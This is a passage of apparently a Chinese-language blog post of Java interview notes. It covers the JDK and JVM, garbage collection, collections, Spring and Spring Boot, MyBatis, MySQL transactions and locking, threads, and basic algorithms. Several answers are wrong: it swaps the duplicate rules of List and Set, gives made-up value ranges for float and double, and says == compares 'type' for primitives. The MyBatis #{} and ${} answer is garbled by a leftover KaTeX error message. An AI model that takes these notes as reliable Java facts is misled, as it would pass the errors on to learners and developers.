kit):是Java开发工具包，是程序员使用JAVA语言编写JAVA程序所需的开发工具包。其包括了JRE和编译器JAVAC，还包括了JAVA程序调试和分析的工具：jconsole，jvisualvm等工具软件，和JAVA变程序编写所需的文档和Demo例子程序。</p>\n<p>如果只需运行JAVA程序，那么只安装JRE就足够了，如果需要编写JAVA程序，需要安装JDK。<br> PS：<br> 一，机器码，完全依附硬件而存在～并且不同硬件由于内嵌指令集不同，即使相同的0 1代 码意思也可能是不同的～换句话说，根本不存在跨平台性～比如～不同型号的CPU,你 给他个指令10001101，他们可能会解析为不同的结果<br> 二，我们知道JAVA是跨平台的，为什么呢？因为他有一个jvm,不论那种硬件，只要你装有 jvm,那么他就认识这个JAVA字节码。至于底层的机器码，咱不用管，有jvm搞定，他 会把字节码再翻译成所在机器认识的机器码</p>\n<p>3.”static”关键字是什么意思？Java中是否可以覆盖(override)一个private或者是static的方法？</p>\n<p>Static：静态修饰符。表明一个成员变量或者成员方法可以在没有所属类的实例变量的情况下被访问。</p>\n<p>JAVA中static方法不能被覆盖，因为方法覆盖是基于运行时动态绑定的，而static方法是编译时静态绑定的，再加上static方法跟类的任何实例都不相关。</p>\n<p>JAVA中private方法不能被覆盖，因为private修饰的变量和方法只能在当前类使用，如果是其他类继承当前类是不能访问private的方法或变量的，所以不能覆盖。</p>\n<p>4.是否可以在static环境中访问非static变量？<br> 不能，因为static变量是属于类的，当类被JAVA虚拟机载入时会对静态变量进行初始化。此时如果静态方法中有非静态变量，由于非静态变量是随着实例的创建而创建，此时还没有实例创建，所以非静态变量还没有创建，所以会出现编译错误</p>\n<p>5.String可以被继承吗？为什么？String str = “abc”;String str = new String(“abc”);分别创建几个对象<br> 答：不能被继承。因为String类有final修饰符，而被final修饰符修饰的不能被继承;<br> 前者0或1个，后者1或两个。若字符串常量池中没有，都在字符串常量池创建一个。后者还需要再堆创建一个“abc”实例变量。</p>\n<p>6.String,StringBuffer,StringBulider的区别？<br> 答：String是字符串常量（final修饰，不可被继承）.<br> 可通过后面两个创建字符串变量。<br> StringBuffer:(线程安全):绝大多数方法进行了同步处理，toString方法进行了对象缓存<br> StringBuilder:(非线程安全):方法没用synchornized修饰，toString会返回一个对象.</p>\n<p>7.集合图解答：<br> List:有序的不可重复（可插入多个null）<br> ArrayList:底层的数据结构是有序数组，线程不同步（查改速度快）<br> LinkList:底层的数据结构是双链表，线程不同步（增删速度快）<br> Vetor:线程安全<br> Set:无序的可重复(只能有一个null)<br> HashSet:底层的数据结构是哈希表，通过hashmap实现的，线程不安全不同步<br> TreeSet:底层的数据结构是二叉树，通过treemap实现的，可对元素进行排序</p>\n<p>Map:键值对<br> HashMap:底层的数据结构是：数组+(链表/红黑树)(处理hash冲突)，线程不同步。<br> TreeMap:底层的数据结构是桶+红黑树，线程不同步，可对Key值排序。<br> LinkHashMap:HashMap的子类，可记住插入数据的顺序。</p>\n<p>哈希图：<br> 8.反射：<br> （1）原理：类被加载时，JVM中会创建一个Class对象，这个对象装在了类的信息<br> （2）获取Class对象的方法：<br> ①对象.getClass<br> ②类.Class<br> ③Class的静态方法forName();<br> （3）作用：通过反射可以使代码获取已加载到JVM的类的属性和方法</p>\n<p>9.Class.forName与ClassLoader的区别?<br> 答：前者会初始化静态代码，后者不会</p>\n<p>10.动态代理的两种方法？<br> JDK(底层是反射)的动态代理跟cglib(底层是asm框架)</p>\n<p>11.final修饰符的作用？<br> 答：①修饰类：变为最终类，不能被继承<br> ②修饰方法：方法不能被重写<br> ③修饰变量：变成常量，常量必须被初始化且不能重新赋值</p>\n<p>12.单例模式：<br> 懒汉模式、饿汉模式、静态内部类、枚举、双重校验锁</p>\n<p>13.hashcode与equals与==<br> 答：每个对象都有hashcode，但不是唯一的。Hashcode相同，对象不一定相同，对象相同，hashcode一定相同。<br> Equals是方法，==是关系运算符，返回值都是boolean<br> 系统类一般已经覆盖了equals方法，比较的是内容<br> 若用户自定以类若没有覆盖equals方法，则调用父类Object的equals方法，比较的是地址<br> ==若是基本数据类型，比较的是类型<br> 若是引用类型（除了8中基本类型），则比较地址。</p>\n<p>当父类需要为子类自动完成hashcode、equals实现，需要覆写hashcode、equals方法。</p>\n<p>14.浅拷贝与深拷贝<br> 答：浅拷贝是只拷贝对象，不拷贝对象的其他信息。如一个Person有Name和Address.拷贝的对象与对象公用属性，若改变其中一个属性，则另一个也会改变。<br> 深拷贝就是完全拷贝一个独立的对象。</p>\n<p>15.数组和链表<br> 数组是有序的，每个元素占用内存相同，可通过下表快速查出元素。查询更改比较快，但是增删比较慢<br> 链表是无序的，通过指针联系在一起，每个节点有两个部分：一个是存储数据元素的数据域，一个是存储下一个节点的指针。</p>\n<p>16.Error、Exception、checkedException、RuntimeException<br> 答：Error:错误信息，是程序无法处理的错误，一般由JVM发出然后中断程序。如系统奔溃、内存空间不足，方法调用栈溢出等。</p>\n<p>17.Exception:异常信息，是程序可以处理的异常。分为checkedException、RuntimeException<br> checkedException是编译异常，分两种情况，一种是知道方法异常后怎么办，用try ctach捕获异常，第二红是不知道怎么办用Throw抛出<br> RuntimeException是运行异常，一般是程序的逻辑错误。如除数是0，数组下标越界、空指针异常。</p>\n<p>18.泛型是用来解决什么的<br> 答：泛型的本质是参数化类型，把操作数的数据类型指定为一个参数，泛型的好处在于在编译时就检查类型安全，并且所有的强制转换都是自动和隐式的，以提高代码的重用率。</p>\n<p>19.什么是序列化，怎么序列化，为什么要序列化，反序列化会遇到什么问题?<br> 答：<br> ①序列化是指可以将一个实例对象的状态信息写入到一个字节流中使其可以过socket进行传输、或持久化存储到数据库或文件系统中。<br> ②实现Serilizable接口。<br> ③把对象的字节序列永久存储到硬盘中，或在网络上传送对象的字节序列。<br> ④JVM会把传来的字节流中的serialVersionUID与本地类的serialVersionUID进行比较，若相同则一致，若不一致会报版本不一致的异常。<br> 可在一个类中显示定义serialVersionUID。</p>\n<p>JVM<br> 1.GC:垃圾回收机制:堆里面的对象当有引用指向它时，计数器+1(引用追踪)，则判断不为垃圾，当没有引用指向它时，则判断为垃圾，垃圾回收器会回收此对象。<br> 引用追踪:缺点：(两个对象互相引用时则计数器一直为1)<br> 可达性分析：将一些GC ROOT对象作为起点，遍历节点，搜索通过的路径成为引用链，当一个对象的没有被引用链引用时则判断为垃圾。</p>\n<p>2.GC的算法：<br> ①标记清除算法：会产生内存碎片<br> ②标记整理算法：代价大<br> ③复制算法：内存大</p>\n<ol>\n<li>内存泄露：无法释放已申请的空间 （柜子钥匙丢了）<br> 内存溢出：申请的空间小于实际的空间。(int大小的空间存储long类型)</li>\n<li>GC一次完整流程<br> 答：对象诞生在Eden区分配-&gt;新生代<br> 当Eden区没有足够空间时，会进行一次Minor GC，如果依旧存活，移动到Form，变成Survivor，进行标记，当一次对象默认超过15次没有被回收掉则进入老年区。</li>\n</ol>\n<p>5.类的加载：将类的.Class文件中的二进制数据读入到内存中，将其放在运行时数据区的方法区中，然后在堆创建一个与该类的java.lang.Class对象。<br> 类的加载过程：三个步骤：Load装载：查找并加载对应的二进制文件<br> Link链接：1)验证 2)准备 3)解析<br> Initialize初始化：初始化静态变量<br> 类什么时候被初始化：6种情况<br> 类什么时候被加载：5种情况<br> 6.垃圾回收器G1(吞吐量优先)和CMS(响应优先)</p>\n<p>开源框架</p>\n<p>1.Tomcat的结构：<br> 一个server服务器，对象多个Service服务，一个Service服务有很多组件，核心的有Connector、Container（多对一），Session组件。<br> Tomcat类加载：BootStrap启动类加载、System系统类加载、Common通用类加载、Wepapp应用类加载</p>\n<p>2.Tomcat如何调优、设计哪些参数<br> ①内存优化<br> ②多线程优化<br> ③缓存优化</p>\n<p>3.为什么要使用Spring<br> ①方便解耦，便于开发（Spring相当于一个大工厂，可以将所有对象的创建和依赖关系维护都交给Spring管理）<br> ②支持AOP编程（Spring提供面向切面编程，可以很方便得实现对程序进行权限拦截和运行监控）<br> ③支持事务的管理（通过配置就可以完成事务的管理，不需要手动编程）</p>\n<p>4.什么是AOP？（动态代理）<br> 面向切面编程。简单来说就是统一处理某一类的问题的编程思想，比如日志、异常等。可以动态地将代码切入到类地指定方法、指定位置上。</p>\n<p>5.什么是Ioc?<br>  答：控制反转，是Spring框架的核心，对于Spring来说，就是由Spring来负责控制对象的生命周期和对象间的关系。在Java开发中，Ioc意味着将自己设计好的类交给系统去控制，而不是类的内部控制，这称为控制反转。所谓控制反转就是应用本身不负责依赖对象的创建及维护，依赖对象的创建及维护是由外部容器负责的。这样控制权就由应用转移到了外部容器，控制权的转移就是所谓反转。<br> 依赖注入：在运行期，由外部容器动态地将依赖对象注入到组件中。</p>\n<p>6.bean的生命周期：<br> ①通过静态工厂或者构造器创建Bean<br> ②为bean属性赋值<br> ③调用bean的初始化方法<br> ④bean可以使用了<br> ⑤当容器关闭时调用Bean的摧毁方法</p>\n<p>7.Spirng有哪些主要模块<br> Spring Core：Spring的核心类库，Spring所有的功能都依赖于此类库，该库主要实现 IOC功能。<br> AOP：提供了常用的拦截器<br> ORM：提供了对常用的ORM框架如hibernate、mybatis的管理和辅助支持。<br> DAO：提供了JDBC的支持，对JDBC进行封装<br> MVC：提供了一套轻量级的MVC实现<br> Context：提供了框架式的Bean访问方式<br> Web：提供常见的框架Strust1、JSF的支持</p>\n<p>8.spring生成并管理对象步骤：<br> ①方法入口<br> ②bean的实例化（创建bean）<br> ③Annotation的支持<br> ④依赖注入（为bean赋值）<br> ⑤初始化bean(InitializeBean)<br> ⑥注册(包扫描+@Controller等注解/@Bean/@Import/继承FactoryBean)<br> 9.Bean的四种实例化：<br> ①构造器（有参无参）<br> ②静态工厂<br> ③实例工厂<br> ④setter<br> 10.Spring常见的注入方式（依赖注入）<br> ①Setter属性注入<br> ②构造器方式注入<br> ③注解方式注入（@component@Controller…）(不用在XML配置bean)<br> \\11. Spring中的bean是安全的吗<br> Spring的大多数bean都是无状态的，某种程度上说是安全的，如果是有状态的话（比如View Model对象）就得自己去保证线程安全。</p>\n<p>12.Spring支持几种bean的作用域?<br> 五种<br> ①singleton<br> ②propotype<br> ③web<br> ④request<br> ⑤session</p>\n<p>13.Spring自动装配bean的方式<br> ①no<br> ②byName<br> ③byType<br> ④构造函数<br> ⑤autodetect</p>\n<p>14.Spring的事务实现方式有哪些：<br> ①声明式事务：基于xml、基于注解<br> ②编码方式</p>\n<p>15.说明一下Spring的事务隔离？(脏读（两个事务t1、t2，t1读取已经被t2更新但是还未上传的数据，加入t2回滚则t1读取的内容无效）、不可重复读、幻读)<br> Spring的五大隔离级别，默认是isolation-default(使用数据库的设置),其他四个隔离级别和数据库的隔离级别一致<br> isolation-read uncommitted<br> isolation-read committed<br> isolation-repeatable read<br> isolation-serializabl</p>\n<p>16.Spring的注解：<br> 16.1@Configuration标识为配置类(代替配置XML文件)，@bean标注配置bean<br> 16.2@Component-scan类似XML文件中的扫描包<br> 16.3@Scope设置作用域<br> 16.4@Lazy-bean懒加载<br> 16.5@Import给容器中快速导入一个组件<br> 16.6@Autowired(类型优先)/@Resource(名字优先)/@Qualifier(多个组件时，指定装配的ID)：自动装配<br> 16.7@PropertySource加载外部配置文件</p>\n<p>17.SpringMVC：<br> 13.1 运行流程：<br> Springmvc 先发送请求给DispatherServlet<br> DispatherServlet查询一个或多个HandlerMapping,找到处理请求的Controller<br> Controller进行了业务逻辑处理后返回一个ModelAndView<br> DispatherServlet查询一个或多个ViewResolver视图解析器，找到ModelAndView对象指定的视图对象。<br> 视图对象负责渲染返回给客户端。</p>\n<p>13.2有哪些组件？<br> 前端控制器DispatherServlet<br> 映射处理器handlerMapping<br> 处理器Controller<br> 模板和视图ModelAndView<br> 视图解析器ViewResolver</p>\n<p>13.3 @RequestingMapping的作用？<br> 处理请求地址的注解，可作用于类或方法上，若作用在类上，表示类中所有的响应请求方式都是以该地址为父路径。<br> 有六种注解属性value、method、comsumes、produces、params、headers</p>\n<p>13.4 @autowired的作用？<br> 完成自动装配，通过@autowired的使用消除set\\get方法(从Spring容器中获取实现类，注入该属性)</p>\n<p>SpringBoot<br> 1.什么是SringBoot?<br> 答：Springboot是Spirng的一个子项目，目的是为了简化Spring的使用，它简省了Spring的配置，提供了各种启动器。</p>\n<p>2.为什么要使用SpringBoot<br> 答：①为解决Java开发中，繁多的配置，复杂的部署，和第三方插件的集成难度。<br> ②Springboot使用“习惯大于配置”的理念让项目快速的运行起来，使用SpringBoot可以很容易创建一个独立运行的Jar,内嵌servlet容器。</p>\n<p>3.Springboot的核心配置文件是什么？<br> ①bootstrap.(yaml或properties):是由父工程ApplicationContext加载的，比aplication优先加载，且里面的属性不能被覆盖<br> ②application(yaml或properties):用于springboot项目的自动化配置</p>\n<p>4.Springboot的配置文件有哪几种类型？它们有什么区别？<br> Yaml和properties。主要是书写风格不同，yaml不支持@PropertySource注解导入</p>\n<p>5.Springboot有哪些方式可以启动热部署？<br> ①使用devtools启动热部署。<br> ②用IDEA编辑器，勾上自动编译或手动重新编译。</p>\n<p>6.SpringBoot常用的注解：<br> 答：@RestController:结合Controller跟@ResponseBody的功能<br> @SpringBootApplication:@ComponentScan、@Configuration(等于配置XML文件)、@EnableAutoConfiguration<br> @Autowired：自动导入<br> @PathVariable:将URL中占位符参数绑定到控制器处理方法的入参中</p>\n<p>7.Jpa和hibernate有什么区别？<br> Hibernate是一个JPA实现，Spring Date jpa是一个jpa数据访问抽象，其始终需要JPA提供程序，如hibernate或Eclipse Link</p>\n<p>Mybatis<br> 1.#{},与KaTeX parse error: Expected ‘EOF’, got ‘#’ at position 10: {}的区别？ 答：#̲{}会将传入的加上””,{}直接传入值</p>\n<p>2.mybatis有几种分页方式？<br> ①逻辑分页：使用Mybatis自带的RowBounds进行分页，他是一次性查询很多数据，然后在数据中再进行检索。<br> ②物理分页：使用分页插件如pagehelper，去数据库查询指定条数的分页数据</p>\n<p>3.RowBounds是一次性查出所有数据吗？为什么？<br> 不是，RowBounds表面上是在所有的数据中进行检索，但是mybatis是对jdbc进行封装，jdbc的驱动中有一个fetch size的配置，它规定了每次最多从数据取出的条数，若超出这个条数，执行next()的时候会去查询更多的数据。</p>\n<p>4.Mybatis是否支持延迟加载？原理是什么？<br> Mybatis支持延时加载，使用lazyLoadingEnable = true；即可<br> 原理是调用的时候再触发加载，而不是再初始化的时候就加载信息</p>\n<p>5.Mybatis与hibernate的区别？<br> ①mybatis更加灵活，是半自动化ORM框架，可以自己写SQL语句<br> ②mybatis的数据库可移植性比较差，因为它是自己写SQL语句，每个数据据SQL语句可能不同。<br> ③Mybatis使用门槛比较低<br> ④hibernate的二级缓存更加好</p>\n<p>6.Mybatis有哪些执行器（executor）？<br> ①simpleExecutor：每次执行select或update就会开启一个statement对象，用完立刻关闭对象<br> ②reuserExcutor：执行select或update,以SQL作为KEY值查找statement对象，不存在就窜创建，存在就使用，用完不关闭statement对象，而是放在map内供下一次使用<br> ③batchExecutor:执行update的时候，将所有的SQL都添加到批处理中，等待统一执行。</p>\n<p>7.Mybatis实现分页插件的原理是什么？<br> 使用Mybatis提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的SQL，然后再重写SQL，根据dialect方言，添加对应的物理分页语句和物理分页参数。</p>\n<p>8.如何编写一个自定义的插件？<br> 答：实现interceptor接口<br> 数据库<br> 1.数据库的三范式<br> 第一范式：强调的是数据库的原子性，即数据库表的每一列都是不可分割的原子数据项<br> 第二范式：实体的属性都完全依赖于数据库主关键字<br> 第三范式：任何非主属性都不依赖于其他非主属性</p>\n<p>2.数据库的引擎：InnoDB、myISAM<br> InnoDB会保留数据库表存储的ID最大值<br> myIsam会记录保存过的最大值ID</p>\n<p>3.说一说ASID是什么<br> Atomicity(原子性):一个事务的所有事件都是绑定的，全部完成或者全部不完成，即中间某个事件出了错，会回滚到事务开始前的状态。<br> Consisitency(一致性)：事务开始前和结束后数据库的完整性没有被破坏。<br> Isolation(隔离性)：数据库允许多个事件并发执行，隔离性可以防止事件的交叉执行而影响数据。<br> Durability(持久性)：事务结束后对数据库的修改是永久的，即使系统故障也不会丢失。</p>\n<p>4.Char跟varchar的区别<br> ①char是固定长度类型，效率高但是占内存，适合存储密码的MD5值<br> ②varchar是可变长度类型，效率低但是节省内存</p>\n<p>5.float跟double的区别<br> ①float是单精度浮点型，取值范围为-127-128，在内存中占4个字节<br> ②double是双精度浮点型，取值范围为-1023-1024，在内存中占8个字节</p>\n<p>6.MySQL的内连接、左连接、右连接的区别？<a href=\"https://blog.csdn.net/rocling/article/details/90516802\">https://blog.csdn.net/rocling/article/details/90516802</a><br> 答：inner join、left join、right join<br> 内连接是查询两表共有的数据<br> 左连接是从左表中返回的所有值，即使右表没有<br> 右连接相反右表中返回的所有值，即使左表没有</p>\n<p>7.Mysql的索引是如何实现的？<br> 答：索引是满足某种特定算法的数据结构，而这些数据结构会以某种方式指向数据，从而实现高效查找数据</p>\n<p>8.Mysql的事务隔离？<br> Read-uncommitted:未提交读，最低的隔离级别、事务未提交前就可被其他事务读取（可导致脏读、幻读、不可重复读）<br> Read-committed:提交读，提交后才能被读取（会造成幻读、不可重复读）<br> Repeatable-read:可重复度。默认级别，保证多次读取同一个数据时，其值都和事务开始的内容时一致的，禁止读取到别的事务未提交的数据（会造成幻读）<br> Serilizable:序列化，代价最高最可靠的隔离级别，能防止脏读、幻读、不可重复读）</p>\n<p>脏读：一个事务获取了另一个事务还提交的数据<br> 不可重复读：一个事务内多次读到同一数据<br> 幻读：同一事务内多次查询返回的结果集不一样</p>\n<p>9.Msql的引擎？<br> ①InnoDB：默认数据库的引擎，聚焦索引，提供了对数据库ACID事务的支持，还提供了行级锁和外键的约束<br> ②myIASM：非聚焦索引，不提供事务的支持，也不提供行级锁和外键</p>\n<p>10.行锁和表锁？<br> 答:MyISAM只支持表锁，InnerDB支持行锁跟表锁<br> 表级锁：开销小，加锁快，不会死锁。但是锁的力度大，发生锁冲突概率大，并发量最低。<br> 行级锁：开销大，加锁慢，会出现死锁。锁的力度小，发生锁冲突概率小，并发量最高。</p>\n<p>11.乐观锁与悲观锁？<br> 答：<br> 乐观锁：每次去拿数据的时候都认为别人不会修改，所以不上锁，但是在提交更新的时候会判断再此期间别人有没有去更新这个数据</p>\n<p>悲观锁：每次去拿数据的时候都认为别人会修改，所以每次拿数据的时候都会上锁，这样别人想拿这个数据的时候就会阻止，直到这个锁被释放。</p>\n<p>多线程<br> 1.什么是线程跟进程？<br> 答：①进程：在操作系统中能够独立运行，并且作为资源分配的基本单位。它表示运行中的程序，系统运行一个程序就是从一个进程的创建、运行到消亡的过程<br> ②线程：是比进程更小的执行单位，能够完成进程中的一个功能，一个进程在执行过程中可以有多个线程。同个类的线程共享进程的堆和方法区。</p>\n<p>2.什么是并发和并行？<br> 并发指的是多个任务交替进行，并行是真正意义上的同时进行（在多个CPU的系统中）。</p>\n<p>3.线程的生命周期和状态？<br> 答：<br> 新生状态：线程创建但是还未调用start()方法<br> 就绪状态：调用了strat方法，但是线程调度程序还没有把该程序设置为当前线程<br> 运行状态：线程调度程序将处于就绪状态的线程设置为当前线程，线程进入运行状态，开始 执行run函数的方法<br> 阻塞状态：线程在运行状态的时候被暂停。使用sleep()、wait()、synchronized()都会使线程 进入阻塞状态。<br> 死亡状态：当一个线程run方法执行完毕或者使用stop方法结束线程的时候，线程会进入 死亡状态，无法再使用strat()方法令其进入就绪状态.</p>\n<p>4.Sleep()方法跟wait()方法的区别？<br> 答：都能让线程进入阻塞状态<br> 不同：<br> sleep()没有释放锁，属于Thread类的静态方法，作用于线程，执行后可以通过超时或者调用interrupt()方法唤醒休眠中的线程。<br> wait()方法释放了锁，属于Object类的实例方法，作用与对象本身，执行后可以调用notify或者notifyAll唤醒线程.</p>\n<p>5.什么是线程的死锁？如何避免？<br> 答：多个线程同时被阻塞，它们中的一个或多个都在等待某个资源被释放，由于线程被无限期地阻塞，因此程序不可能正常终止。</p>\n<p>6.多线程开发会带来哪些问题？如何解决？<br> 答：①线程安全问题：指的是线程中开始访问到结束访问某一数据的时候，该数据可能被其他线程修改，那么对于当前线程就会表现为数据丢失、数据不一致等问题<br> 解决：尽量不要使用共享变量；使用synchronized或lock加锁；使用ThreadLocal()为每一个线程建立一个变量的副本，各个线程间独立操作，互不影响.</p>\n<p>②性能问题：一个线程从创建到销毁会占用大量的内存<br> 解决：利用线程池</p>\n<p>③活跃性问题：死锁、饥饿（线程优先级较低）、活锁（一直让资源）<br> 解决：避免一个线程同时获取多个锁；尝试使用定时锁</p>\n<p>④阻塞</p>\n<p>7.synchronized关键字<br> 答：synchronized关键字可以保证被它修饰的方法或者代码块在任何时刻都只能有一个线程执行。<br> synchronized关键字最主要的三种使用方式：修饰实例方法、修饰静态方法、修饰代码块<br> 对于普通同步方法，锁是当前实例对象<br> 对于静态同步方法，锁是当前类的Class对象<br> 对于同步代码块，锁是括号里配置的对象</p>\n<p>8.synchronized和lock的区别?<br> ①synchronized是关键字，lock是接口<br> ②synchronized发生异常时，会自动释放锁，因此不会导致死锁。Lock发生异常时，如果没有主动通过unlock去释放锁，则可以导致死锁<br> ③lock可以让等待锁的线程响应中断，而synchronized却不可以，使用synchronized线程会一直等待下去.<br> ④通过lock可以知道有没有成功获取锁(tryLock获取返回的boolean)，而synchronized却不可以<br> ⑤lock可以提高多个线程进行读操作的效率.</p>\n<p>9.volatile关键字？<br> 答：保证共享变量的可见性。可见性是指一个线程修改了共享变量的值，其他线程能读到这个修改的值。</p>\n<p>10.synchronized关键字与volatile的区别？<br> 答：①volatile主要是解决多个线程间的可见性，synchronized主要是解决多个线程间的 访问资源的同步性。<br> ②volatile关键字只能用于变量，而synchronized关键字可用于方法和代码块<br> ③volatile关键字不会发生阻塞，而synchronized关键字可能发生阻塞<br> ④volatile性能较好</p>\n<p>11.什么是线程池？为什么要使用？常见的线程池及其应用场景？线程池的工作队列?<br> 答：(1)线程池就是创建若干个可执行的线程放入一个容器中，有任务需要处理时，会提交到线程池中的任务队列，处理完之后线程不会被销毁，而是在线程池等待下一个任务。<br> (2)因为创建一个线程需要消耗大量的内存，所以应避免频繁的创建和销毁。<br> (3)①FixedThreadPool:可重用固定线程池：适用于负载比较重的服务器<br> ②SingleThreadExecutor：只会创建一个线程执行任务：适用于需要保证顺序执行各个任务；并且在任意时间点，没有多线程活动的场景。<br> ③CacherThreadPool：会根据需要调整线程数量的线程池：适用于负载比较轻的服务器</p>\n<p>(4)ArrayBlockingQueue：是一个基于数据结构的有界阻塞队列<br> LinkedBlockingQueue：基于链表结构的阻塞队列<br> SynchronousQueue：不存储元素的阻塞队列<br> PriorityBlockingQueue：具有优先级的无限阻塞队列</p>\n<p>12.创建多线程的方式？<br> 继承Thread类<br> 实现Runnable接口<br> 实现Callable接口<br> 使用Executor框架</p>\n<p>数据结构与算法<br> 线性结构：只有唯一的第一个和最后一个，除了第一位都有唯一“前继”，除了最后一位都有唯一“后继<br> 非线性结构（树、网状）</p>\n<p>数据结构类型：<br> 线性表*：n个类型相同的有限序列<br> 线性表的存储结构：顺序表ArrayList(只存数据不存地址，位置隐含着地址，)、<br> 链表<br> 单链表():每个节点有两个域，一个域存放当前数据，另一个存 放下一个单元的指针.(在第一个节点前面添加哑元 节点)<br> 双链表LinkedList:每个节点有三个域，第一个域存放上一个单 元的指针，第二个节点存放数据，第三个节点存放下一个节点 的指针.(在第一个和最后一个存放哑元节点)</p>\n<p>（数组：<br> 字符串//：<br> 栈：先进后出.push pop peek(获取).存储结构可以是数组也可以是链表<br> 队列：先进先出。只允许在一端插入，另一端删除.存储结构可以是数组也可以是链表<br> 广义表//：</p>\n<p>树(节点度/树的度为最大的节点度/节点度为0成为叶子节点或终端节点)）都是线性表：<br> 二叉树：先序遍历、中序遍历、后续遍历(完全二叉树、平衡二叉树(它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树)、二叉查找(排序/搜索)树(左子树&lt;根&lt;右子树))<br> B树：O(log n) (2-3树，最简单的B树)<br> B+树<br> 红黑树(特殊的二叉查找树):<br> 哈希表：（数据结构-&gt;顺序表加链表）最高效。O(1)可能会有hash冲突</p>\n<p>图：</p>\n<p>算法:<br> 冒泡：<br> 选择：遍历两次，第一次遍历最小的下标，第二次遍历全部找出最小值填入下标。<br> 插排：遍历一次，从第2个数开始，前面的看成一个有序数组，后面的看成无序数组<br> 希尔：（先进行简单分组排序的插排）交换法(效率低)、移动法<br> 快排：冒泡的改进版：取中间的数作为基准数，定义low跟high，low从左往右，high从右往左找出比基准数大跟的小的值交换位置。<br> 二分查找：<br> ①不使用递归：<br> ②使用递归：</p>\n<p>时间/空间复杂度：运行程序需要多少次，N接近无穷大时。</p>\n<p>牛客网面试题：</p>\n<p>1.什么是Java内存模型？<br> 答：Java内存模型即Java Memory Model，简称JMM。JMM定义了Java  虚拟机(JVM)在计算机内存(RAM)中的工作方式。程序中的变量存储在主内存中，每个线程拥有自己的工作内存并存放变量的拷贝，线程读写自己的工作内存，通过主内存进行变量的交互。JMM就是规定了工作内存和主内存之间变量访问的细节，通过保障原子性、有序性、可见性来实现线程的有效协同和数据的安全</p>\n<p>JVM内存结构:运行时数据区<br> Java对象模型:对象头、实例数据、对齐填充。</p>\n<p>2.Array跟ArrayList的区别？<br> 答：Array的长度是固定的，ArrayList的长度是可变的，但底层也是数组，通过数组的扩容到原数组的1.5倍。Array可以包含基本类型和对象类型，ArrayList只能包含对象类型</p>\n<p>3.谈一谈，使用标签库有什么好处？如何自定义JSP标签？</p>\n<ul>\n<li>分离JSP页面的内容和逻辑，简化了Web开发；</li>\n<li>开发者可以创建自定义标签来封装业务逻辑和显示逻辑；</li>\n<li>标签具有很好的可移植性、可维护性和可重用性；</li>\n<li>避免了对Scriptlet的使用</li>\n</ul>\n<p>可以使用一个类来继承TagSupport/BodyTagSupport/SimpleTagSupport类，然后重写doStartTag()、doEndTag()等方法，定义标签要完成的功能，即可以完成自定义标签</p>\n<p>4.使用过Spring的注解吗？说一说@autowired跟@Resource的区别？<br> 答：都是自动装配bean。前者优先按类型扫描，如果扫描不到通过名称扫描。<br> 后者刚好相反.</p>\n<p>5.JAVA应用服务器有哪些？<br> 答：Tomcat、Jetty、JBoss</p>\n<p>6.Mybatis中的动态SQL语句？<br> 答：动态SQL是指我们可以通过一些标签自定义SQL语句，使语句更加灵活，且可以防止SQL注入，常用标签有if、choose、when、trim、where等</p>\n<p>7.JVM内存模型？<br>  答：JVM内存模型是指JVM的内存模型包括方法区（线程共享）：常量、静态变量、JIT(即时编译器)编译后的代码也都在方法区；堆内存（线程共享）：垃圾回收的主要场所，用来存储对象实例；程序计数器：  当前线程执行的字节码的位置指示器；虚拟机栈（栈内存）：保存局部变量、基本数据类型变量以及堆内存中某个对象的引用变量；本地方法栈：为JVM提供使用native 方法的服务运行时常量池；</p>\n<p>8.多线程同步的方法？<br> 答:多线程最常见的同步方法是使用synchronized同步锁(可以锁普通方法、静态方法、代码块)，使用显示锁Lock以及使用volatile关键字来保证线程同步。</p>\n<p>9.为什么重写equals要重写hashcode()？<br> 答:如果不重写的话，hashmap存储相同key的value值的时候，会存放不同的值。因为相同对象的hashcode不相同，</p>\n<p>10.接口：接口的字段默认是final static，接口名只能是public abstract修饰.接口可以extends多个接口.可以有静态方法或者default方法，但是普通方法不能有实体。无构造函数<br> 抽象：抽象类的字段跟普通类一样。可以定义普通方法跟抽象方法。如果方法无实体必须是抽象方法。可以定义构造函数。接口跟抽象都不能被实例化</p>\n<p>11.Linux查看线程的命令<br> 答：ps -ax (-a) 或 top -H</p>\n<p>12.正向代理、反向代理<br> 答：正向代理：你找马云借钱，马云不借，你找朋友向马云借钱，马云借给你朋友但是他不知道是真实是你要的。（隐藏(代理)客户端）<br> 反向代理：你打电话给10086解决问题，但是并不知道是谁接的电话。（隐藏(代理)服务器）</p>\n<p>13.动态代理 静态代理<br>  答：纵观静态代理与动态代理，它们都能实现相同的功能，而我们看从静态代理到动态代理的这个过程，我们会发现其实动态代理只是对类做了进一步抽象和封装，使其复用性和易用性得到进一步提升而这不仅仅符合了面向对象的设计理念，其中还有AOP的身影，这也提供给我们对类抽象的一种参考。关于动态代理与AOP的关系，个人觉得AOP是一种思想，而动态代理是一种AOP思想的实现！</p>\n<p>14.@Responbody的作用：把返回值变成Json字符串形式</p>\n<p>15.索引多了会有什么影响？<br> 答：降低数据增删改的性能.</p>\n<p>16.如何防止SQL注入？<br> ①SpringMVC自定义拦截器：(1)自定义拦截器类实现HandlerIntercepor接口(2)配置拦截器<br> ②mybatis传入值使用#{}，预编译</p>\n<p>17.常量池：<a href=\"https://blog.csdn.net/yuan_qh/article/details/100851544\">https://blog.csdn.net/yuan_qh/article/details/100851544</a></p>\n<p>18.Cooike跟Session的区别？<br> 答：为什么使用?：因为web应用使用http传输数据，http是一种无状态协议，每次传输完后都会关闭连接，再次交换数据又要再次连接。而使用Cooike跟Session可以解决。<br> Cooike是保存在客户端上的，即电脑的硬盘上。(效果好，安全性差，但是可加密)<br> Session是保存在服务器上的，即浏览器一关闭就失效。(效果差，安全性高)</p>\n<p>19.计算一个数组的元素数量</p>\n<p>20.List list = new ArrayList();和ArrayList list=new ArrayList();的区别<br> 答：List是一个接口，有很多实现方法比如Arraylist跟LinkedList，左边是先创建一个ArrayList对象然后上溯成List对象，右边是创建一个ArrayList实例对象。左边实现了面向对象的特性。左边为编译时的类型，右边为运行时的类型。</p>\n<p>21.Map 中的 key 和 value 可以为 null 么？<br> 答：HashMap的key跟value可以均为null，<br> HashTable的key跟value均不可为null.</p>\n<ol>\n<li>JSP与Servlet的区别？<br> 答：<br> （1）JSP是HTML里写JAVA代码，框架是HTML，而Servlet是JAVA代码里写HTML代码，其本身是JAVA类<br> （2）JSP把显示和逻辑分隔，意味着两者开发可并发；而Servlet没有把两者分离<br> 